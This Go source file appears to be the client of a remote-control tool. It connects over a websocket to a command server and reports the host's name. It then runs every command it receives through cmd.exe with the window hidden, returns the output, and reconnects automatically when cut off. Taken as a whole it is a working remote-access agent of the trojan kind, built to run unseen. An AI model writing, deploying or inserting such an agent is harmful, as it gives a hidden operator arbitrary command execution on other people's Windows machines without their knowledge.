package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"
	"yotamura/common"

	"github.com/gorilla/websocket"
	"github.com/mitchellh/mapstructure"
)

var addr = flag.String("addr", "localhost:8080", "http service address")

type Client struct {
	*common.Client
}

func Exec(command string) ([]byte, error) {
	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd_instance := exec.Command(cmd_path, "/c", command)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd_output, err := cmd_instance.Output()
	return cmd_output, err
}

func (c *Client) runCommand(command string) {
	//runs the requested command with Exec()
	//and sends a message back to the server

	output, err := Exec(command)
	if err != nil {
		//handle err
	}
	data := common.CommandData{Command: command, Output: string(output)}
	c.SendJsonMessage(common.CreateMessage(data))
	fmt.Println("sent command data")
}

func DecodeData(input any, output any) {
	if err := mapstructure.Decode(input, output); err != nil {
		fmt.Printf("Error decoding CommandData: %v\n", err)
	}
}

func (c *Client) HandleMessages() {
	for {
		// message := <-c.Message
		message := c.GetWsMessage()
		fmt.Println(message)

		// switch message.Type {
		// case "CommandData":
		// 	fmt.Println("command")
		// 	data := message.Data.(*common.CommandData)
		// 	fmt.Println(data)
		// 	c.runCommand(data.Command)
		// default:

		// }

		switch message.Type {
		case "CommandData":
			fmt.Println("command")
			var content common.CommandData
			DecodeData(message.Data, &content)
			c.runCommand(content.Command)
		case "StatsData":
			fmt.Println("stats")
			var content common.StatsData
			DecodeData(message.Data, &content)
			c.Name = content.Name
		default:
			fmt.Printf("Unknown message type: %s\n", message.Type)
		}
	}
}

func (c *Client) SendStats() {
	//sends the information about this client
	//such as the pc hostname
	//and possibly other things

	hostname, _ := os.Hostname()
	// c.Name = hostname

	c.SendJsonMessage(common.CreateMessage(common.StatsData{Name: hostname}))
}

func reconnect() {
	fmt.Println("reconnecting in 10s")
	time.Sleep(10 * time.Second)
	go main()
}

func main() {
	flag.Parse()

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	u := url.URL{Scheme: "ws", Host: *addr, Path: "/ws"}
	fmt.Printf("connecting to %s\n", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("dial:", err)
		go reconnect()
		return
	}
	defer c.Close()

	done := make(chan struct{})

	client := Client{
		Client: &common.Client{
			Ws:             c,
			Message:        make(chan common.Message),
			MessageChannel: make(map[string]chan common.Message),
		},
	}

	go client.HandleMessages()
	fmt.Println("handle messages goroutine started")
	go client.SendStats()
	go func() {
		defer close(done)
		for {
			_, msg, err := c.ReadMessage()
			if err != nil {
				fmt.Println("read:", err)
				// fmt.Printf("%t", err)
				go reconnect()
				return
			}

			message := common.Message{}
			err = json.Unmarshal(msg, &message)
			if err != nil {
				fmt.Println("failed to convert message to struct")
			}

			// client.Message <- message
			client.BroadcastWsMessage(message)
		}
	}()

	channel := make(chan os.Signal, 1)
	signal.Notify(channel, os.Interrupt, syscall.SIGTERM)

	<-channel
	os.Exit(0)

	// ticker := time.NewTicker(time.Second)
	// defer ticker.Stop()

	// for {
	// 	select {
	// 	case <-done:
	// 		return
	// 	case t := <-ticker.C:
	// 		fmt.Println(t)
	// 		 err := c.WriteMessage(websocket.TextMessage, []byte(t.String()))
	// 		 if err != nil {
	// 		 	fmt.Println("write:", err)
	// 			return
	// 		 }
	// 	case <-interrupt:
	// 		fmt.Println("interrupt")

	// 		// Cleanly close the connection by sending a close message and then
	// 		// waiting (with timeout) for the server to close the connection.
	// 		err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	// 		if err != nil {
	// 			fmt.Println("write close:", err)
	// 			return
	// 		}
	// 		select {
	// 		case <-done:
	// 		case <-time.After(time.Second):
	// 		}
	// 		return
	// 	}
	// }
}
